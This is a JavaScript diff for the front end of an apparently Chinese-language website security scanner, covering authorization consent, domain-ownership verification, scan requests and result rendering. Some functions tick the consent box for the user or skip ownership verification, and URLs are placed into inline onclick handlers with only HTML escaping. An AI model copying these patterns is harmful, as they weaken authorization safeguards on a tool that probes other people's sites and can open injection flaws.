+function getScoreColor(score) {
+  score = parseInt(score, 10);
+  if (isNaN(score)) score = 0;
+  if (score >= 75) return '#73c990';
+  if (score >= 50) return '#f0a732';
+  return '#c75450';
+}
+
+function getScoreGradient(score) {
+  score = parseInt(score, 10);
+  if (isNaN(score)) score = 0;
+  score = Math.max(0, Math.min(100, score));
+  if (score >= 75) return 'conic-gradient(#73c990 0% ' + score + '%, #334155 ' + score + '% 100%)';
+  if (score >= 50) return 'conic-gradient(#f0a732 0% ' + score + '%, #334155 ' + score + '% 100%)';
+  return 'conic-gradient(#c75450 0% ' + score + '%, #334155 ' + score + '% 100%)';
+}
+
+function getRiskClass(level) {
+  if (level === '高风险' || level === 'high') return 'high';
+  if (level === '中风险' || level === 'medium') return 'medium';
+  return 'low';
+}
+let verifyToken = '';
+let selectedVerifyMethod = '';
+
+function startScanDirect() {
+  try {
+  let urlInput = document.getElementById('scan-url');
+  let url = urlInput ? urlInput.value.trim() : '';
+  if (!url) { showToast('请输入目标网址'); return; }
+  // 授权确认检查
+  let authStep1 = document.getElementById('auth-check-step1');
+  if (!authStep1 || !authStep1.checked) {
+    showToast('请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。');
+    return;
+  }
+  // 记录勾选时间
+  try {
+    let authTime = new Date().toISOString();
+    localStorage.setItem('vs_auth_checked_at', authTime);
+    // 在线模式：发送到后端（静默，不阻塞）
+    if (isLoggedIn()) {
+      authFetch('/api/scan-auth-log', {
+        method: 'POST',
+        body: JSON.stringify({ authorized_at: authTime })
+      }).catch(function(){});
+    }
+  } catch(e) {}
+  // 自动补全协议
+  if (!/^https?:\/\//i.test(url)) {
+    url = 'https://' + url;
+    if (urlInput) urlInput.value = url;
+  }
+  if (!isLoggedIn()) { showToast('请先登录'); navigateTo('profile'); return; }
+  // 11-S fix: 同步首页授权状态到扫描页，避免 step1 勾了但 step3 没勾导致卡住
+  // authStep1 已在函数开头声明，此处复用
+  let authStep3 = document.getElementById('auth-check');
+  if (authStep1 && authStep3 && authStep1.checked) {
+    authStep3.checked = true;
+    // 触发按钮状态更新
+    let scanBtn = document.getElementById('scan-btn');
+    if (scanBtn) scanBtn.disabled = false;
+  }
+  // 11-S：已登录用户跳过 step3 二次确认，直接开始扫描（合规授权已在 step1 完成）
+  // 同时把 URL 也填到 step3 输入框，保留 step3 备用
+  let confirmedInput = document.getElementById('scan-url-confirmed');
+  if (confirmedInput) confirmedInput.value = url;
+  // 直接触发扫描
+  startScan();
+  } catch (e) {
+    console.error('startScanDirect error:', e);
+    _scanInProgress = false;
+    setButtonLoading("scan-btn", false);
+    setButtonLoading("scan-btn-step1", false);
+    showToast('扫描启动失败：' + (e.message || String(e)));
+  }
+}
+
+// ============== 复制修复代码 ==============
+function copyFixCode(textareaId) {
+  let ta = document.getElementById(textareaId);
+  if (!ta) return;
+  let code = ta.value;
+  let btn = document.getElementById(textareaId + '-btn');
+  let oldText = btn ? btn.textContent : '';
+  let done = function() {
+    if (btn) {
+      btn.textContent = '已复制';
+      btn.style.background = 'rgba(115,201,144,0.2)';
+      btn.style.color = '#16a34a';
+      btn.style.borderColor = 'rgba(115,201,144,0.4)';
+      setTimeout(function() {
+        btn.textContent = oldText;
+        btn.style.background = 'rgba(75,110,175,0.1)';
+        btn.style.color = '#4f46e5';
+        btn.style.borderColor = 'rgba(75,110,175,0.3)';
+      }, 1500);
+    }
+  };
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(code).then(done).catch(function() {
+      ta.select(); document.execCommand('copy'); done();
+    });
+  } else {
+    ta.select();
+    try { document.execCommand('copy'); done(); } catch (e) { showToast('复制失败，请手动选择'); }
+  }
+}
+
+// ============== 快速扫描入口 ==============
+
+// 友好错误提示工具
+function friendlyError(err) {
+  let msg = (err && (err.message || err.error || err.detail)) || String(err) || '未知错误';
+  if (/timeout|timed out/i.test(msg)) {
+    return '网络连接超时，请检查 URL 是否可访问';
+  }
+  if (/dns|getaddrinfo|Name or service not known/i.test(msg)) {
+    return '域名解析失败，请检查域名是否正确';
+  }
+  if (/403|forbidden/i.test(msg)) {
+    return '目标站点拒绝访问，可能需要授权或绕过 WAF';
+  }
+  if (/404|not found/i.test(msg)) {
+    return '目标页面不存在，请检查 URL 路径';
+  }
+  if (/ssl|certificate|handshake/i.test(msg)) {
+    return 'SSL/TLS 握手失败，证书可能无效或过期';
+  }
+  if (/refused|connect/i.test(msg)) {
+    return '连接被拒绝，目标站点可能不可达';
+  }
+  if (/authorized|授权/i.test(msg)) {
+    return '请先勾选「我已获得授权扫描此目标」';
+  }
+  if (/rate|limit|频率/i.test(msg)) {
+    return '扫描频率超限，请稍后再试';
+  }
+  // 默认截断过长的错误
+  return msg.length > 60 ? msg.substring(0, 60) + '...' : msg;
+}
+window.friendlyError = friendlyError;
+
+
+function quickDemo(url) {
+  try {
+  if (!isLoggedIn()) {
+    showToast('请先登录后再使用');
+    navigateTo('profile');
+    return;
+  }
+  // 登录态：直接填入 URL + 自动勾选授权 + 一键扫描，跳过验证步骤
+  let input = document.getElementById('scan-url');
+  if (input) input.value = url;
+  let authStep1 = document.getElementById('auth-check-step1');
+  if (authStep1 && !authStep1.checked) {
+    authStep1.checked = true;
+    // 触发 change 事件，让 button 启用
+    authStep1.dispatchEvent(new Event('change'));
+  }
+  // 记录授权勾选时间
+  try {
+    let authTime = new Date().toISOString();
+    localStorage.setItem('vs_auth_checked_at', authTime);
+    authFetch('/api/scan-auth-log', {
+      method: 'POST',
+      body: JSON.stringify({ authorized_at: authTime })
+    }).catch(function(){});
+  } catch(e) {}
+  startScanDirect();
+  } catch (e) {
+    console.error('quickDemo error:', e);
+    showToast('启动扫描失败：' + (e.message || String(e)), 'error');
+  }
+}
+
+// 页面加载时刷新告警红点
+document.addEventListener('DOMContentLoaded', function() {
+  updateAlertBadge();
+  // 每 60 秒刷新一次未读告警红点
+  setInterval(updateAlertBadge, 60000);
+  // 初始化扫描页模块
+  try { initScanPage(); } catch (e) { console.warn('initScanPage error:', e); }
+});
+
+
+
+function showFullScanDetail() {
+  if (window._demoAfterResult) {
+    renderResult(window._demoAfterResult);
+  }
+}
+
+function getRiskColor(level) {
+  if (!level) return 'var(--text-secondary)';
+  if (level.indexOf('高') >= 0 || level.indexOf('critical') >= 0) return '#c75450';
+  if (level.indexOf('中') >= 0 || level.indexOf('medium') >= 0) return '#f0a732';
+  if (level.indexOf('低') >= 0 || level.indexOf('low') >= 0) return '#16a34a';
+  return 'var(--text-secondary)';
+}
+
+function goVerifyStep2() {
+  let urlInput = document.getElementById('scan-url');
+  let url = urlInput ? urlInput.value.trim() : '';
+  if (!url) { showToast('请输入目标网址'); return; }
+  // 自动补全协议
+  if (!/^https?:\/\//i.test(url)) {
+    url = 'https://' + url;
+    if (urlInput) urlInput.value = url;
+  }
+  // 前端 URL 格式校验：提前拦截无效域名，避免进入 Step 2 后无法扫描
+  try {
+    let parsed = new URL(url);
+    let host = parsed.hostname.toLowerCase();
+    if (!host || host.indexOf('.') === -1) {
+      showToast('网址格式不正确，请输入完整域名（如 example.com）');
+      return;
+    }
+    let tld = host.split('.').pop();
+    if (tld.length < 2) {
+      showToast('网址格式不正确，域名后缀至少 2 个字符（如 .com、.cn）');
+      return;
+    }
+  } catch (e) {
+    showToast('网址格式不正确，请输入有效的 URL');
+    return;
+  }
+  // Generate verification token
+  verifyToken = 'vs-' + Math.random().toString(36).substring(2, 10) + '-' + Date.now().toString(36);
+  let host = getHost(url);
+  let tokenEl = document.getElementById('verify-token');
+  let dnsEl = document.getElementById('dns-record');
+  let step1 = document.getElementById('verify-step-1');
+  let step2 = document.getElementById('verify-step-2');
+  let infoEl = document.getElementById('verify-method-info');
+  let btnEl = document.getElementById('verify-confirm-btn');
+  if (tokenEl) tokenEl.textContent = verifyToken;
+  if (dnsEl) dnsEl.textContent = '_vuln-sentinel.' + host + ' TXT "' + verifyToken + '"';
+  if (step1) step1.style.display = 'none';
+  if (step2) step2.style.display = 'block';
+  selectedVerifyMethod = '';
+  if (infoEl) infoEl.innerHTML = '<p>请选择一种验证方式</p>';
+  if (btnEl) btnEl.disabled = true;
+}
+
+function selectVerifyMethod(el, method) {
+  selectedVerifyMethod = method;
+  document.querySelectorAll('.verify-method').forEach(function(item) { item.classList.remove('selected'); });
+  if (el) el.classList.add('selected');
+  let info = document.getElementById('verify-method-info');
+  if (info) {
+    if (method === 'dns') {
+      info.innerHTML = '<p>已选择 DNS TXT 验证。请在域名 DNS 管理中添加 TXT 记录后点击确认。</p>';
+    } else {
+      info.innerHTML = '<p>已选择网站文件验证。请在网站根目录创建验证文件后点击确认。</p>';
+    }
+  }
+  let confirmBtn = document.getElementById('verify-confirm-btn');
+  if (confirmBtn) confirmBtn.disabled = false;
+}
+
+function skipVerification() {
+  if (!isLoggedIn()) { showToast('请先登录'); navigateTo('profile'); return; }
+  let urlInput = document.getElementById('scan-url');
+  let url = urlInput ? urlInput.value.trim() : '';
+  if (!url) { showToast('请输入目标网址'); return; }
+  // 自动补全协议
+  if (!/^https?:\/\//i.test(url)) {
+    url = 'https://' + url;
+    if (urlInput) urlInput.value = url;
+  }
+  if (!confirm('注意：跳过域名归属验证将直接进入扫描阶段。该选项仅适用于您已确认拥有该目标网站或正在测试环境使用的场景。\n\n继续吗？')) return;
+  let confirmedInput = document.getElementById('scan-url-confirmed');
+  if (confirmedInput) confirmedInput.value = url;
+  let step2 = document.getElementById('verify-step-2');
+  let step3 = document.getElementById('verify-step-3');
+  if (step2) step2.style.display = 'none';
+  if (step3) step3.style.display = 'block';
+  showToast('已跳过验证，进入快速扫描');
+}
+
+function confirmVerification() {
+  if (!selectedVerifyMethod) { showToast('请先选择验证方式'); return; }
+  if (!isLoggedIn()) { showToast('请先登录'); navigateTo('profile'); return; }
+  let btn = document.getElementById('verify-confirm-btn');
+  let urlInput = document.getElementById('scan-url');
+  let url = urlInput ? urlInput.value.trim() : '';
+  if (!url) { showToast('请输入目标网址'); return; }
+  // 自动补全协议
+  if (!/^https?:\/\//i.test(url)) {
+    url = 'https://' + url;
+    if (urlInput) urlInput.value = url;
+  }
+  if (btn) { btn.disabled = true; btn.textContent = '正在查询 DNS / 下载验证文件...'; }
+  authFetch('/api/verify', {
+    method: 'POST',
+    body: JSON.stringify({ url: url, token: verifyToken, method: selectedVerifyMethod })
+  }).then(function(resp) { return resp.json(); }).then(function(data) {
+    if (btn) { btn.disabled = false; btn.textContent = '我已添加验证信息，确认验证'; }
+    if (data.success) {
+      let confirmedInput = document.getElementById('scan-url-confirmed');
+      if (confirmedInput) confirmedInput.value = url;
+      let step2 = document.getElementById('verify-step-2');
+      let step3 = document.getElementById('verify-step-3');
+      if (step2) step2.style.display = 'none';
+      if (step3) step3.style.display = 'block';
+      showToast('验证通过：' + (data.message || ''));
+    } else {
+      showToast('验证失败：' + (data.message || '未找到验证信息'), 'error');
+      let info = document.getElementById('verify-method-info');
+      if (info) info.innerHTML = '<p style="color:var(--danger)">注意： ' + escapeHtml(data.message || '验证失败') + '</p>';
+    }
+  }).catch(function(err) {
+    if (btn) { btn.disabled = false; btn.textContent = '我已添加验证信息，确认验证'; }
+    showToast('验证请求失败：' + err.message, 'error');
+  });
+}
+
+function copyToken() {
+  copyToClipboard(verifyToken);
+  showToast('Token 已复制');
+}
+
+function calculateScore(findings, hasFixConfig, hasPR) {
+  let score = 100;
+  findings.forEach(function(f) {
+    if (f.level === '高风险') score -= 18;
+    else if (f.level === '中风险') score -= 10;
+    else if (f.level === '低风险') score -= 4;
+  });
+  if (hasFixConfig) score += 12;
+  if (hasPR) score += 10;
+  return Math.max(10, Math.min(98, score));
+}
+
+function startScan() {
+  try {
+  if (_scanInProgress) { showToast("扫描进行中，请稍候"); return; }
+  if (!isLoggedIn()) { showToast('请先登录后再使用扫描功能'); navigateTo('profile'); return; }
+  _scanInProgress = true;
+  setButtonLoading("scan-btn", true);
+  let authCb = document.getElementById('auth-check');
+  let auth = authCb ? authCb.checked : false;
+  if (!auth) { _scanInProgress = false; setButtonLoading("scan-btn", false); showToast('请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。'); return; }
+  // 记录勾选时间
+  try {
+    let authTime = new Date().toISOString();
+    localStorage.setItem('vs_auth_checked_at', authTime);
+    authFetch('/api/scan-auth-log', {
+      method: 'POST',
+      body: JSON.stringify({ authorized_at: authTime })
+    }).catch(function(){});
+  } catch(e) {}
+  // 11-S 兼容：如果 scan-url-confirmed 是空（直接走 startScan），用 scan-url 兜底
+  let confirmedInput = document.getElementById('scan-url-confirmed');
+  let url = confirmedInput ? confirmedInput.value.trim() : '';
+  if (!url) {
+    let urlInput = document.getElementById('scan-url');
+    url = urlInput ? urlInput.value.trim() : '';
+    if (url && confirmedInput) confirmedInput.value = url;
+  }
+  if (!url) { _scanInProgress = false; setButtonLoading("scan-btn", false); showToast('请输入网址'); return; }
+
+  // 自动补全 URL：不加协议默认 https://
+  if (!/^https?:\/\//i.test(url)) {
+    url = 'https://' + url;
+  }
+
+  // 前端 URL 格式校验：域名必须包含点号且至少 2 个字符的 TLD
+  try {
+    let parsed = new URL(url);
+    let host = parsed.hostname.toLowerCase();
+    if (!host || host.indexOf('.') === -1) {
+      _scanInProgress = false; setButtonLoading("scan-btn", false);
+      showToast('网址格式不正确，请输入完整域名（如 example.com）');
+      return;
+    }
+    let tld = host.split('.').pop();
+    if (tld.length < 2) {
+      _scanInProgress = false; setButtonLoading("scan-btn", false);
+      showToast('网址格式不正确，域名后缀至少 2 个字符（如 .com、.cn）');
+      return;
+    }
+  } catch (e) {
+    _scanInProgress = false; setButtonLoading("scan-btn", false);
+    showToast('网址格式不正确，请输入有效的 URL');
+    return;
+  }
+
+  let host = getHost(url);
+  navigateTo('result');
+
+  // Show scanning progress UI
+  let progressHtml = '<div class="report-header fade-in-up">' +
+    '<div style="font-size:48px;margin-bottom:16px"></div>' +
+    '<h2 style="margin-bottom:8px;font-size:clamp(16px,5vw,22px)">正在扫描 ' + escapeHtml(host) + '</h2>' +
+    '<p style="color:var(--text-lighter);font-size:13px;margin-bottom:20px">AI 安全引擎正在分析目标网站...</p>' +
+    '<div style="max-width:min(320px,90vw);margin:0 auto 20px;background:rgba(255,255,255,0.1);border-radius:2px;height:8px;overflow:hidden">' +
+    '<div id="scan-progress-bar" style="height:100%;background:linear-gradient(90deg,#4b6eaf,#818cf8);width:5%;border-radius:2px;transition:width 0.3s"></div></div>' +
+    '<div id="scan-progress-text" style="font-size:12px;color:var(--text-lighter)">正在初始化扫描引擎...</div>' +
+    '<button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:500;transition:background 0.15s" onmouseover="this.style.background=\'rgba(199,84,80,0.25)\'" onmouseout="this.style.background=\'rgba(199,84,80,0.15)\'"> 取消扫描</button>' +
+    '</div>';
+  let resultContent = document.getElementById('result-content');
+  if (resultContent) resultContent.innerHTML = progressHtml;
+  let scanDepthInput = document.querySelector('input[name="scan-depth"]:checked');
+  let scanDepth = (scanDepthInput && scanDepthInput.value) || 'standard';
+  let deepScan = scanDepth === 'deep';
+  startRealScan(url, host, deepScan);
+  } catch (e) {
+    console.error('startScan error:', e);
+    _scanInProgress = false;
+    setButtonLoading("scan-btn", false);
+    let rc = document.getElementById('result-content');
+    if (rc) {
+      rc.innerHTML = '<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">错误：</div><h3 style="color:var(--danger);margin-bottom:8px">扫描启动失败</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在启动扫描时遇到问题。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：' + escapeHtml(e.message || String(e)) + '</p><button class="btn btn-primary" onclick="navigateTo(\'home\')"> 返回首页</button></div>';
+    } else {
+      showToast('扫描启动失败：' + (e.message || String(e)), 'error');
+    }
+  }
+}
+
+let _scanCancelled = false;
+function cancelScan() {
+  if (!_scanInProgress) return;
+  _scanCancelled = true;
+  _scanInProgress = false;
+  setButtonLoading("scan-btn", false);
+  // 清除进度动画
+  if (typeof finishStages === 'function') finishStages();
+  if (typeof stopProgressAnimation === 'function') stopProgressAnimation();
+  showToast('扫描已取消');
+  // 返回首页
+  setTimeout(function() {
+    navigateTo('home');
+    _scanCancelled = false;
+  }, 300);
+}
+
+function startRealScan(url, host, deepScan) {
+  // 启动多阶段动画
+  animateStages();
+
+  // 超时保护：35 秒后自动终止
+  let timeoutId = setTimeout(function() {
+    if (_scanCancelled) return;
+    finishStages();
+    setTimeout(function() {
+      if (_scanCancelled) return;
+      renderScanError('扫描超时，目标网站可能无法访问。请检查网址是否正确，或稍后重试。', url);
+      _scanInProgress = false;
+      setButtonLoading("scan-btn", false);
+    }, 600);
+  }, 35000);
+
+  // Try /api/scan
+  authFetch('/api/scan', {
+    method: 'POST',
+    body: JSON.stringify({ url: url, depth: deepScan ? 'deep' : 'standard', authorized: true })
+  }).then(function(resp) {
+    if (_scanCancelled) return;
+    clearTimeout(timeoutId);
+    if (!resp.ok) throw new Error('API 返回 ' + resp.status);
+    return resp.json();
+  }).then(function(data) {
+    if (_scanCancelled) return;
+    clearTimeout(timeoutId);
+    if (data.error) {
+      finishStages();
+      setTimeout(function() {
+        if (_scanCancelled) return;
+        renderScanError(extractError(data), url);
+        _scanInProgress = false;
+        setButtonLoading("scan-btn", false);
+      }, 600);
+      return;
+    }
+    finishStages();
+    setTimeout(function() {
+      if (_scanCancelled) return;
+      let merged = mergeRealData(url, data);
+      lastScanResult = merged;
+      saveScanHistory(merged);
+      renderResult(merged);
+      _scanInProgress = false;
+      setButtonLoading("scan-btn", false);
+    }, 400);
+  }).catch(function(err) {
+    if (_scanCancelled) return;
+    clearTimeout(timeoutId);
+    finishStages();
+    setTimeout(function() {
+      if (_scanCancelled) return;
+      renderScanError('扫描服务连接失败，请检查网络或稍后重试', url);
+      _scanInProgress = false;
+      setButtonLoading("scan-btn", false);
+    }, 600);
+  });
+}
+
+function mergeRealData(url, apiData) {
+  // Build a scan result using real API data — 不再硬塞假 finding
+  let host = getHost(url);
+  // 防御性：确保 apiData 是对象
+  apiData = apiData || {};
+  // 防御性：确保 findings 是数组
+  let findings = Array.isArray(apiData.findings) ? apiData.findings : [];
+  // 归一化严重度：后端 severity（high/medium/low）→ 前端展示字段
+  findings.forEach(function(f) {
+    if (f.severity && !f.level_zh) {
+      let zhMap = { high: '高风险', medium: '中风险', low: '低风险', critical: '严重' };
+      f.level_zh = zhMap[f.severity] || '低风险';
+      f.level = f.level_zh;
+    }
+  });
+
+  let score = apiData.score;
+  let riskLevel = apiData.risk_level;
+
+  let aiReport = {
+    summary: '对 ' + host + ' 的真实安全扫描已完成。共发现 ' + findings.length + ' 个安全问题，综合安全评分为 ' + score + ' 分（满分 100）。',
+    priority: findings.length > 0 ? '优先修复标记为"高风险"的安全问题。' : '安全状况良好，建议持续监控。',
+    boundary: '本次检测基于真实 HTTP 响应头分析。'
+  };
+
+  return {
+    url: url,
+    time: new Date().toLocaleString('zh-CN'),
+    score: score,
+    risk_level: riskLevel,
+    scan_mode: 'real',
+    scan_id: apiData.scan_id || null,
+    ai_report: aiReport,
+    owasp_coverage: apiData.owasp_coverage || [],
+    findings: findings,
+    header_details: apiData.header_details || [],
+    info_leaks: apiData.info_leaks || [],
+    cors: apiData.cors || null,
+    cookie_issues: apiData.cookie_issues || [],
+    raw_headers: apiData.raw_headers || {},
+    is_https: apiData.is_https !== false,
+    restricted: apiData.restricted || false,
+    restricted_reason: apiData.restricted_reason || '',
+    restricted_code: apiData.restricted_code || '',
+    redirected: apiData.redirected || false,
+    redirect_reason: apiData.redirect_reason || '',
+    // 保留 SRC 级字段供新渲染器使用
+    headers: apiData.headers || apiData.raw_headers || {},
+    waf: apiData.waf || (apiData.waf_list && apiData.waf_list[0] ? apiData.waf_list[0].name : null),
+    ssl: apiData.ssl || apiData.ssl_info || {},
+    duration_ms: apiData.duration_ms || 0,
+    report_share_id: apiData.report_share_id || null,
+    discovered_at: findings.length > 0 && findings[0].discovered_at ? findings[0].discovered_at : new Date().toISOString()
+  };
+}
+
+// Render Scan Error (site unreachable / fake URL)
+function renderScanError(errorMsg, url) {
+  let container = document.getElementById('result-content');
+  if (!container) return;
+  let safeUrl = escapeHtml(url);
+
+  // 检测是否是登录/跳转长链接
+  let isLoginUrl = /login|redirect|spm|havana|sso|auth|signin/i.test(url);
+  let isLongUrl = url.length > 80;
+  let mainDomain = '';
+  try {
+    let u = new URL(url);
+    mainDomain = u.protocol + '//' + u.hostname;
+  } catch (e) {}
+
+  // 分类错误提示
+  let isDnsFail = errorMsg && (errorMsg.indexOf('无法解析') !== -1 || errorMsg.indexOf('DNS') !== -1);
+  let isTimeout = errorMsg && errorMsg.indexOf('超时') !== -1;
+  let isConnectFail = errorMsg && errorMsg.indexOf('无法连接') !== -1;
+  let isDomainVerify = errorMsg && (errorMsg.indexOf('域名归属验证') !== -1 || errorMsg.indexOf('域名验证') !== -1);
+
+  if (isDomainVerify) {
+    // 深度扫描需要域名验证的专属引导
+    let html = '<div class="card" style="padding:24px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.3);border-radius:2px;text-align:center;max-width:600px;margin:0 auto;">';
+    html += '<div style="font-size:14px;font-weight:600;color:#4b6eaf;margin-bottom:12px">安全登录</div>';
+    html += '<h3 style="margin:0 0 8px;color:#4b6eaf">深度扫描需要域名归属验证</h3>';
+    html += '<p style="color:var(--text-secondary);margin:0 0 20px;font-size:14px;line-height:1.6">' + escapeHtml(errorMsg) + '</p>';
+    html += '<p style="color:var(--text-secondary);margin:0 0 20px;font-size:13px">为了符合安全要求，深度扫描（爬虫 + 漏洞探测）需要先证明您拥有该域名。</p>';
+    html += '<div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap">';
+    html += '<button onclick="document.getElementById(\'verify-domain\').value=\'' + safeUrl + '\'; goVerifyStep2();" class="btn-primary" style="padding:10px 20px;border-radius:2px;border:none;background:#4b6eaf;color:white;cursor:pointer;font-size:14px">立即验证域名</button>';
+    html += '<button onclick="startScanDirect(\'' + safeUrl + '\', false)" class="btn-secondary" style="padding:10px 20px;border-radius:2px;border:1px solid var(--border);background:transparent;color:var(--text-primary);cursor:pointer;font-size:14px">改用普通扫描</button>';
+    html += '</div></div>';
+    container.innerHTML = html;
+    return;
+  }
+
+  let title = '无法完成扫描';
+  let subtitle = errorMsg;
+  let reasons = [
+    '&#x2022; 目标站点可能拒绝自动化请求（反爬机制）',
+    '&#x2022; 目标需要登录或身份认证',
+    '&#x2022; 当前 URL 是跳转/登录链接，不是主站',
+    '&#x2022; 网站设置了访问限制（如 IP 黑名单）',
+    '&#x2022; 网站已下线或服务器故障'
+  ];
+  if (isDnsFail) {
+    title = '域名无法解析';
+    reasons = [
+      '&#x2022; 网址拼写错误，或域名尚未注册',
+      '&#x2022; DNS 服务器暂时无法解析',
+      '&#x2022; 本地网络 DNS 配置问题'
+    ];
+  }
+
+  let html = '<div class="report-header fade-in-up">';
+  html += '<div style="margin-bottom:12px">';
+  html += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">注意： 扫描失败</span>';
+  html += '</div>';
+  html += '<div class="score-ring-wrap">';
+  html += '<div class="score-ring" style="background:#3c3f41">';
+  html += '<div class="score-value" style="color:#fff">--</div>';
+  html += '<div class="score-label" style="color:rgba(255,255,255,0.7)">无法评分</div>';
+  html += '</div></div>';
+  html += '<div class="report-url">' + safeUrl + '</div>';
+  html += '<div class="report-time">' + new Date().toLocaleString('zh-CN') + '</div>';
+  html += '<span class="risk-badge high">无法扫描</span>';
+  html += '</div>';
+
+  html += '<div class="card fade-in-up" style="animation-delay:0.1s;text-align:center;padding:40px 20px">';
+  html += '<div style="font-size:48px;margin-bottom:16px"></div>';
+  html += '<h3 style="margin-bottom:12px;color:var(--danger)">' + title + '</h3>';
+  html += '<p style="color:var(--text-light);margin-bottom:20px;max-width:400px;margin-left:auto;margin-right:auto">' + escapeHtml(subtitle) + '</p>';
+
+  // 登录/跳转链接提示
+  if (isLoginUrl || isLongUrl) {
+    html += '<div style="background:rgba(240,167,50,0.1);border:1px solid rgba(240,167,50,0.3);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2;margin-bottom:16px">';
+    html += '<p><strong>提示： 检测到登录/跳转长链接</strong></p>';
+    html += '<p>建议扫描网站主域名，而不是登录页或跳转链接。</p>';
+    if (mainDomain) {
+      html += '<div style="margin-top:10px;text-align:center">';
+      html += '<button class="btn btn-primary" onclick="retryScanWithUrl(\'' + escapeHtml(mainDomain) + '\')" style="font-size:13px"> 改扫主域名：' + escapeHtml(mainDomain) + '</button>';
+      html += '</div>';
+    }
+    html += '</div>';
+  }
+
+  html += '<div style="background:var(--bg);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2">';
+  html += '<p><strong>可能的原因：</strong></p>';
+  reasons.forEach(function(r) { html += '<p>' + r + '</p>'; });
+  html += '</div>';
+
+  // 修改网址重新扫描
+  html += '<div style="margin-top:20px;text-align:left;border-top:1px solid var(--border);padding-top:20px">';
+  html += '<label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">修改网址重新扫描：</label>';
+  html += '<div style="display:flex;gap:8px">';
+  html += '<input id="retry-url-input" type="url" value="' + safeUrl + '" style="flex:1;padding:10px 14px;border:2px solid var(--border);border-radius:2px;font-size:14px;outline:none" />';
+  html += '<button class="btn btn-primary" onclick="retryScan()" style="white-space:nowrap"> 重试</button>';
+  html += '</div>';
+  html += '<div style="margin-top:12px;text-align:center">';
+  html += '<button onclick="backToScanInput()" style="background:none;border:none;color:var(--primary);font-size:13px;cursor:pointer"><- 返回修改网址</button>';
+  html += '</div></div>';
+  html += '</div>';
+
+  container.innerHTML = html;
+  navigateTo('result');
+}
+
+// 用指定 URL 重试扫描
+function retryScanWithUrl(newUrl) {
+  _scanInProgress = false;
+  setButtonLoading("scan-btn", false);
+  let input = document.getElementById('scan-url');
+  if (input) input.value = newUrl;
+  startScan();
+}
+
+function backToScanInput() {
+  // 回到扫描输入页（Step 1），重置所有状态
+  _scanInProgress = false;
+  setButtonLoading("scan-btn", false);
+  let step1 = document.getElementById('verify-step-1');
+  let step2 = document.getElementById('verify-step-2');
+  let step3 = document.getElementById('verify-step-3');
+  if (step1) step1.style.display = 'block';
+  if (step2) step2.style.display = 'none';
+  if (step3) step3.style.display = 'none';
+  // 清空结果区域，避免旧内容干扰
+  let resultContent = document.getElementById('result-content');
+  if (resultContent) resultContent.innerHTML = '';
+  navigateTo('scan');
+}
+
+function retryScan() {
+  // 重置扫描状态，允许重新扫描
+  _scanInProgress = false;
+  setButtonLoading("scan-btn", false);
+  let input = document.getElementById('retry-url-input');
+  if (!input) return;
+  let url = input.value.trim();
+  if (!url) { showToast('请输入网址'); return; }
+  // 授权确认检查（深度扫描/重试时）
+  let authCheck = document.getElementById('auth-check');
+  if (!authCheck || !authCheck.checked) {
+    showToast('请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。');
+    return;
+  }
+  // 自动补全协议
+  if (!/^https?:\/\//i.test(url)) {
+    url = 'https://' + url;
+  }
+  input.value = url;
+  let host = getHost(url);
+  // 进入扫描进度 UI（多阶段动画）
+  let container = document.getElementById('result-content');
+  if (!container) return;
+  let stages = [
+    { id: 'dns', label: 'DNS 解析', detail: host },
+    { id: 'connect', label: 'TCP 连接', detail: '443/80 端口' },
+    { id: 'headers', label: '响应头分析', detail: '9 项安全头' },
+    { id: 'ssl', label: 'SSL 证书检查', detail: '证书链/有效期' },
+    { id: 'sensitive', label: '敏感路径扫描', detail: '12 个路径' },
+    { id: 'waf', label: 'WAF 识别', detail: '6 类厂商指纹' },
+    { id: 'report', label: '生成报告', detail: '评分/修复建议' }
+  ];
+  let stagesHtml = stages.map(function(s, i) {
+    return '<div id="stage-' + s.id + '" class="scan-stage" style="display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:2px;margin-bottom:6px;opacity:0.4;transition:all 0.3s">' +
+      '<div class="stage-icon" style="width:24px;height:24px;border-radius:50%;background:rgba(75,110,175,0.15);display:flex;align-items:center;justify-content:center;font-size:12px;color:#a5b4fc">...</div>' +
+      '<div style="flex:1">' +
+        '<div style="font-size:13px;font-weight:600">' + s.label + '</div>' +
+        '<div style="font-size:11px;color:var(--text-secondary)">' + s.detail + '</div>' +
+      '</div>' +
+      '<div class="stage-status" style="font-size:11px;color:var(--text-secondary)">等待</div>' +
+    '</div>';
+  }).join('');
+  let progressHtml = '<div class="report-header fade-in-up">' +
+    // 3D 旋转的扫描雷达 + 百分比
+    '<div style="position:relative;height:160px;margin-bottom:16px;display:flex;align-items:center;justify-content:center">' +
+      '<div id="scan-3d-orbit" style="position:relative;width:140px;height:140px">' +
+        '<div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.3);animation:spin 3s linear infinite"></div>' +
+        '<div style="position:absolute;inset:14px;border-radius:50%;border:2px solid rgba(168,85,247,0.4);animation:spin 2s linear infinite reverse"></div>' +
+        '<div style="position:absolute;inset:28px;border-radius:50%;border:2px solid rgba(115,201,144,0.3);animation:spin 4s linear infinite"></div>' +
+        // 脉冲波纹
